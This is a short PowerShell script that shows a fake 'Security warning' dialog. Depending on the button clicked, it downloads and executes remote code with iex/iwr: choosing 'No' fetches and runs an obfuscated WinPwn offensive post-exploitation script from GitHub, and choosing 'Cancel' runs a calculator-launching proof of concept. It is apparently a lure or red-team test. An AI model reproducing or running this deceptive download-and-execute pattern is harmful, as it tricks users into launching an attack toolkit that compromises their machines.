Add-Type -AssemblyName PresentationCore,PresentationFramework
$msgBoxInput =  [System.Windows.MessageBox]::Show('There was an security issue do you want to continue?','Security warning','YesNoCancel','Error')

switch  ($msgBoxInput) {

  'Yes' {

    $wshell = New-Object -ComObject Wscript.Shell

    $wshell.Popup("Operation Completed",0,"Done",0x1)

  }

  'No' {iex (iwr -uri https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/master/Obfus_SecurePS_WinPwn.ps1)}

  'Cancel' {iex (iwr -uri https://raw.githubusercontent.com/arntsonl/calc_security_poc/master/ps1/calc.ps1)}

}